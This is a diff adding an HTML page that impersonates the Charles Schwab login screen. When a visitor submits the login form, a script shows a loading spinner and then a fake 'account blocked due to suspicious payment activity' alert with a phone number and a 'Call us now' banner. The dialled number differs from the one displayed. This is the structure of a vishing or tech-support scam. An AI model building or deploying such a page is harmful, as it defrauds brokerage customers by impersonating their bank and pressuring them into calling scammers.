@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HBGJEYWSRE"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-HBGJEYWSRE');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login | Charles Schwab</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      max-width: 100%;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      height: 100vh;
+    }
+
+    .header {
+      height: 2cm;
+      background-color: #ffffff;
+      display: flex;
+      align-items: center;
+      padding-left: 20px;
+      position: relative;
+    }
+
+    .header img {
+      height: 100%;
+      object-fit: contain;
+      max-height: 64px;
+    }
+
+    .banner {
+      width: 100%;
+      height: auto;
+      background-image: url('your-banner-image.jpg');
+      background-size: cover;
+      background-position: 50% 25%;
+      background-repeat: no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 25px 0;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 26px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: calc(300px + 5cm);
+      height: auto;
+      position: relative;
+      max-width: 420px;
+    }
+
+    .login-header {
+      text-align: left;
+      font-size: 22px;
+      color: #000;
+      margin-bottom: 16px;
+    }
+
+    .warning-message {
+      color: #d32f2f;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    .warning-message a {
+      color: #d32f2f;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .warning-message a:hover {
+      text-decoration: underline;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 7px;
+      margin: 5px 0 10px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #005a9e;
+      color: white;
+      border: none;
+      border-radius: 0px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #004a82;
+    }
+
+    .forgot-links a {
+      color: #006e99;
+      text-decoration: none;
+    }
+
+    .forgot-links a:hover {
+      text-decoration: underline;
+    }
+
+    .language-select {
+      display: flex;
+      align-items: center;
+      margin: 0px;
+    }
+
+    .language-select label {
+      margin-right: 10px;
+    }
+
+    .language-select select {
+      width: 150px;
+      margin-bottom: 0;
+    }
+
+    .info-section {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      padding: 20px 0;
+      background-color: #f9f9f9;
+    }
+
+    .info-box {
+      flex: 1;
+      margin: 0 10px;
+      text-align: left;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      background-color: white;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .info-box img {
+      width: 100%;
+      height: 150px;
+      object-fit: contain;
+      margin-bottom: 10px;
+    }
+
+    .info-box h3 {
+      font-size: 1.2em;
+      margin: 10px 0 5px;
+      color: #333;
+    }
+
+    .info-box p {
+      font-size: 0.9em;
+      color: #555;
+      margin: 0;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 10px;
+      background-color: #f4f4f4;
+      font-size: 0.8em;
+      color: #777;
+    }
+
+    .call-banner {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: #0078d4;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+      z-index: 1000;
+    }
+
+    .call-banner a {
+      color: white;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .call-banner a:hover {
+      text-decoration: underline;
+    }
+
+    .remember-me {
+      overflow: hidden;
+      clear: both;
+    }
+
+    .remember-me input#remember-me-checkbox-stack {
+      float: left;
+      width: auto;
+      margin: 0 10px 10px 0;
+    }
+
+    label#remember-me-text-stack {
+      float: left;
+      font-size: 15px;
+      line-height: 1;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #005a9e;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 768px) {
+      .call-banner {
+        display: none;
+      }
+
+      .login-container {
+        width: 90%;
+        max-width: none;
+      }
+    }
+  </style>
+
+  <script>
+    function showWarningMessage(event) {
+      event.preventDefault();
+      const loader = document.getElementById("loader");
+      const warningMessage = document.getElementById("warningMessage");
+      const callBanner = document.getElementById("callBanner");
+
+      // Show loader
+      loader.style.display = "block";
+
+      // After 2 seconds, hide loader and show warning
+      setTimeout(() => {
+        loader.style.display = "none";
+        warningMessage.style.display = "block";
+        callBanner.style.display = "block";
+      }, 2000);
+    }
+  </script>
+</head>
+<body>
+
+  <!-- Header Section -->
+  <div class="header">
+    <img src="your-logo.png" alt="Logo">
+  </div>
+
+  <!-- Banner Section -->
+  <div class="banner">
+    <div class="login-container">
+      <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Please wait...</p>
+      </div>
+
+      <div class="warning-message" id="warningMessage">
+        YOUR ACCOUNT IS BLOCKED DUE TO SUSPICIOUS PAYMENT ACTIVITY<br>
+        Please call: <a href="tel:+18883437118">+1(888) 370-8943</a> for help.<br>
+        Do not attempt to log in again.
+      </div>
+
+      <div class="login-header">Login to Schwab</div>
+      <form onsubmit="showWarningMessage(event)">
+        <label for="username">Login ID</label>
+        <input type="text" name="username" id="username" required>
+
+        <label for="password">Password</label>
+        <input type="password" name="password" id="password" required>
+
+        <label for="startPage">Start Page</label>
+        <select name="startPage" id="startPage" required>
+          <option value="account_summary" selected>Account Summary</option>
+          <option value="account_balance">Account Balance</option>
+          <option value="position">Position</option>
+          <option value="trade_ticket">Trade Ticket</option>
+          <option value="history">History</option>
+          <option value="stock_etf_trading">Stock & ETF Trading</option>
+          <option value="option_trading">Option Trading</option>
+          <option value="mutual_fund_trading">Mutual Fund Trading</option>
+          <option value="bond_trading">Bond Trading</option>
+          <option value="research">Research</option>
+          <option value="order_status">Order Status</option>
+          <option value="watchlist">Watchlist</option>
+        </select>
+
+        <div class="remember-me">
+          <input type="checkbox" id="remember-me-checkbox-stack" name="remember-me-checkbox-stack">
+          <label id="remember-me-text-stack" for="remember-me-checkbox-stack">Remember Login ID</label>
+        </div>
+
+        <button type="submit">Login</button>
+      </form>
+
+      <div class="forgot-links"><br>
+        <a href="#">Forgot Login ID or Password?</a><br>
+      </div>
+
+      <div class="language-select">
+        <label for="language">Language:</label>
+        <select name="language" id="language">
+          <option value="en" selected>English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <div class="info-section">
+    <div class="info-box">
+      <img src="image1.jpg" alt="Section 1">
+      <h3>Bull or Bear?</h3>
+      <p>With the Services, you can get insights into investor ticks based on actual trading behavior of Schwab clients.</p>
+    </div>
+    <div class="info-box">
+      <img src="image2.jpg" alt="Section 2">
+      <h3>Looking to fund the future, you've always imagined?</h3>
+      <p>Learn how Schwab can help</p>
+    </div>
+    <div class="info-box">
+      <img src="image3.jpg" alt="Section 3">
+      <h3>The Schwab Investor Card® from ATM Express.</h3>
+      <p>Earn a $300 Card Statement Credit when you spend $1,000 in the first 3 months of Card Membership. Offer ends Soon. Terms apply.</p>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>&copy; 2025 Schwab. All rights reserved.</p>
+    <p><a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a></p>
+  </div>
+
+  <div class="call-banner" id="callBanner">
+    Need help? Call us now: <a href="tel:+18883437118">+1(888) 370-8943</a>
+  </div>
+
+</body>
+</html>
